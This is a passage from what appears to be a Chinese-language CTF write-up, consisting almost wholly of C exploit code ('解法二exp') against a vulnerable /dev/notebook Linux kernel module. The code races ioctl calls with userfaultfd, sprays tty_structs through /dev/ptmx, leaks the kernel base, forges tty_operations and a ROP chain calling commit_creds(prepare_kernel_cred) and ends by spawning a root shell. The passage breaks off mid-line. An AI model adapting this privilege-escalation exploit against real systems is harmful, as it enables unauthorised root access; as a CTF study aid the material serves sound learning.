rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-type">size_t</span>) &amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">write</span>(note_fd, rop, fake_stack_idx);                    <span class="hljs-comment">// copy the ropchain</span><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_ops_data, fake_tty_ops_idx);    <span class="hljs-comment">// hijack the tty_operations</span><br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_data, tty_idx);                 <span class="hljs-comment">// hijack the tty_struct</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        <span class="hljs-built_in">write</span>(tty_fd[i], page, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解法二exp</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81007115</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_RET 0xffffffff81358842</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff81000091</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ 0xffffffff810338bb</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBP_RET 0xffffffff81000367</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> * buf; <span class="hljs-comment">// for userfaultfd</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffd_msg</span> msg;<br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">uffdio_copy</span> uffdio_copy;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pollfd</span> pollfd;<br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = <span class="hljs-built_in">poll</span>(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = <span class="hljs-built_in">read</span>(uffd, &amp;msg, <span class="hljs-built_in">sizeof</span>(msg));<br><br>        <span class="hljs-built_in">sleep</span>(<span class="hljs-number">100</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ioctl</span>(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <br>&#123;<br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125; Note;<br><br><span class="hljs-type">long</span> note_fd;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteAddWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteAdd</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteEditWrapper</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note * note = (Note*) args;<br>    <span class="hljs-built_in">noteEdit</span>(note-&gt;idx, note-&gt;size, note-&gt;buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">noteGift</span><span class="hljs-params">(<span class="hljs-type">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    Note note = <br>    &#123;<br>        .buf = buf,<br>    &#125;;<br>    <span class="hljs-built_in">ioctl</span>(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_add);<br>    <span class="hljs-built_in">noteAdd</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x50</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">sem_wait</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">noteEdit</span>((<span class="hljs-type">int</span>)args, <span class="hljs-number">0x2000</span>, buf);<br>&#125;<br><br><span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">void</span> * buf;<br>    <span class="hljs-type">size_t</span> size;<br>&#125; notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="hljs-number">-1</span>, fake_stack_idx = <span class="hljs-number">-1</span>, hit_tty = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">tmp_t</span>, <span class="hljs-type">add_t</span>, <span class="hljs-type">edit_t</span>;<br>    Note note;<br>    <span class="hljs-built_in">saveStatus</span>();<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">sem_init</span>(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    page_size = <span class="hljs-built_in">sysconf</span>(_SC_PAGE_SIZE);<br><br>    <span class="hljs-built_in">registerUserFaultFd</span>(buf, <span class="hljs-number">0x1000</span>, fault_handler_thread);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">noteAdd</span>(i, <span class="hljs-number">0x20</span>, page);<br>        <span class="hljs-built_in">noteEdit</span>(i, TTY_STRUCT_SIZE, page);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x80</span>; i++)<br>        tty_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">pthread_create</span>(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evilAdd, (<span class="hljs-type">void</span>*)i);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        <span class="hljs-built_in">sem_post</span>(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br><br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n&quot;</span>, SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">read</span>(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">errExit</span>(<span class="hljs-string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you got so many tty_structs.&quot;</span>);<br>    <br>    <span class="hljs-built_in">noteEdit</span>(fake_tty_ops_idx, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), fake_tty_data);<br>    <span class="hljs-built_in">noteEdit</span>(fake_stack_idx, <span class="hljs-number">0x100</span>, rop);<br>    <span class="hljs-built_in">noteGift</span>((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data, tty_data, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">0x200</span>);<br><br>    ((<span class="hljs-keyword">struct</span> tty_operations *)fake_tty_ops_data)-&gt;ioctl = WORK_FOR_CPU_FN + kernel_offset;<br>    <span class="hljs-built_in">write</span>(note_fd, fake_tty_ops_data, fake_tty_ops_idx);<br><br>    <span class="hljs-built_in">read</span>(note_fd, tty_data, tty_idx);<br>    <span 